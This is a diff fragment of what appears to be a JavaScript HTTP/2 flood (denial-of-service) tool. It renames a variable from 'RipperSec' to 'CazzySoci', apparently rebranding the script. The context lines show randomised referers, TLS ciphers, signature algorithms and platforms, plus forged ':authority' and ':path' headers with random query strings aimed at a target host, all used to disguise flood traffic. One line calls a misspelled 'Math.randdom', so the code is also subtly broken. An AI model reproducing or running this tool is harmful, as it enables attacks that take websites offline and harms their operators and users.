@@ -2088,7 +2088,7 @@ const sechuas = [
                 "macOS", 
                 "Unknown", 
                 "Windows"];
-var RipperSec = Methods[Math.floor(Math.random() * Methods.length)];
+var CazzySoci = Methods[Math.floor(Math.random() * Methods.length)];
 var randomReferer = refers[Math.floor(Math.random() * refers.length)];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
@@ -2157,7 +2157,7 @@ class NetSocket {
 }
 const Socker = new NetSocket();
 headers[':method'] = "GET";
-RipperSec;
+CazzySoci;
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.randdom() * pathts.length)] + '&' + randstr(0xa) + queryString + randstr(0xa);
 headers[':scheme'] = "https";
